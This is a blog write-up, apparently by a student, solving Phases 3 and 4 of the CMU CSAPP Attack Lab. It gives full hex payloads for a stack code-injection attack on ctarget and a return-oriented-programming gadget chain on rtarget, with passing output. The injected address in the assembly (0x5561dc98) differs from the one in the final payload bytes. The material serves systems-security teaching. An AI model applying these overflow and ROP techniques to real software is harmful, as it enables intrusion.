---
title: Lab3 Attack Lab
toc: true
date: 2017-12-30
tags: [CSAPP]
top: 3
---

CMU 15-213 Lab3 Attack Lab

* [Lab 下载地址](http://csapp.cs.cmu.edu/3e/labs.html)
* [Recitation讲解](https://scs.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=60c65748-2026-463f-8c57-134fd6661cdf)

## Phase3

Phase3的任务是调用`touch3`函数，并传入cookie字符串。所涉及的函数的代码是：

```C
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

```

`touch3`函数会调用函数`hexmatch`进行，对比传入的`sval`字符串(也就是我们要传入的cookie)是否和程序内部的cookie一致。所以我们应该大致清楚attack的步骤：

* 传入参数`sval`到`touch3`, 由于`sval`是字符串指针，所以我们要在%rdi(Arg1 寄存器)中放入字符串的地址。
* 把字符串放在栈中，但是要防止函数调用时将其覆盖。
* 设置`touch3`函数的地址为返回值地址。

这题稍微有些复杂，我们一步一步来，先把cookie(0x59b997fa) 转换成字符串的表达形式，也就是

```
0x59b997fa-> 35 39 62 39 39 37 66 61 00
```

在Linux下，可用`man ascii`查找字符所对应的ascii码。

然后构造注入代码，`touch3`的地址为0x4018fa, 根据phase2我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28, 字符串存放的地址应为%rsp+0x30.

```
#phase3.s
movq $0x5561dc98,%rdi                                                                                                   
pushq $0x004018fa
retq
```

执行命令

```bash
$ gcc -c phase3.s
$ objdump -d phase3.o > phase3.d
```

得到字节码`48 c7 c7 98 dc 61 55 68 fa 18 40 00 c3`:

```
phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 98 dc 61 55 	mov    $0x5561dc98,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq
```

生成最终的字节码：

```txt
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

运行结果

```bash
$ cat phase3.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```


## Phase 4

从Phase4开始，攻击手段变为ROP(Return-Oriented Programming), 并且使用了**栈随机化**和**限制可执行代码区域**。ROP使用现存的代码进行攻击，而不是注入攻击代码。使用ROP的诀窍是找到现存程序中存在ret指令的代码。这些代码一般被叫做gadget.

Phase4的任务与Phase2相同，传递cookie(0x59b997fa)到touch2(0x4017ec), 但是攻击的程序变成rtarget. rtarge内的gadget限定在start_farm和mid_farm之间。

要把cookie作为一个参数，我们只能把cookie写入到(%rsp)，然后弹出。所以首先我们要查找pop指令，pop系列指令如下

![pop](http://or9a8nskt.bkt.clouddn.com/pop.png)

所以我们要查找`5x c3`这样的指令，x可以指代`8,9,a,b,c,d,e,f`。然后再查找mov指令。构成` pop %x; mov %x %rdi; ret`这样的指令，完成cookie传送。其中mov指令如下：

![mov](http://or9a8nskt.bkt.clouddn.com/mov.png)

还有有两个比较重要的指令

* ret: 返回 0xc3
* nop: 什么都不做，只是让程序计数器加一 0x90

由于0x90没有任何意义，所以它可以出现在任何地方。

顺着代码查找，很快就可以找到一个gadget: `58 90 c3 pop %rax; ret;`，地址在0x4019cc.

```
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3  
```

接着查找`mov %rax %rdi`对应的字节码`48 89 c7`。直接搜索`48 89 c7 c3`, 地址在0x4019a2.

```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   
```

最终形成的字符输入为：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 # pop %rax; ret
fa 97 b9 59 00 00 00 00 # cookie
a2 19 40 00 00 00 00 00 # mov %rax %rdi; ret;
ec 17 40 00 00 00 00 00 # touch2的返回地址
```

执行结果为

```bash
$ cat phase4.txt| ./hex2raw| ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

